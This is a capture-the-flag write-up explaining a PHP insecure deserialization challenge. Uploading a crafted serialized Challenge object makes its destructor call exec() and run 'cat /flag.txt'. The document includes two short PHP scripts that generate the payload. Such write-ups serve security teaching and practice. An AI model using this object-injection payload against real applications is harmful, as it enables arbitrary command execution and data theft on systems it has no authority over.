First of all, it is convinient to look for fthe function unserialize with ctrl+f+shift
then, we will find it in the file upload_user.php
Here, basically, there is a button to load a file and it unserializes the file received.
The trick is to pass a file with a Challenge object serialized instead of a User.
In this way, it is possible to use __destruct() -> stop() -> exec()
notice that the source code for the lasses is in data.php.
However, with exec you can execute  linux command.
The following code is the one used to serialized the object:
```php
<?php
class Challenge{

  public $name;
  public $description;
  public $setup_cmd="not null";
  public $stop_cmd="cat /flag.txt";

  function __construct($name, $description){
    $this->name = $name;
    $this->description = $description;
  }
}

$user = new Challenge("cane2","a");
//print_r($user);
echo serialize($user);
?> 
```

## Challange
Read the flag `flag.txt`. 
## Solution
In this website we can download the user as serialized object and then uploaded deserializing it. In data.php is present `Challange` class which is never used in the code but has two methods `start()` and `stop()` which can execute commands. The `start()` method is never invoked, but `stop()` is called when `__decostruct`. If we craft the content of the upload file by serializing the class in this way:
```php
<?php

class Challenge{
  //WIP Not used yet.
  public $name;
  public $description;
  public $setup_cmd=NULL;
  // public $check_cmd=NULL;
  public $stop_cmd="cat /flag.txt";
}

$r = new Challenge();
echo serialize($r);

?>
```
We obtain the flag when we upload the fake user, because after the data is unserialized the object reference is destroyed, calling the decostructor, executing `cat /flag.txt`.
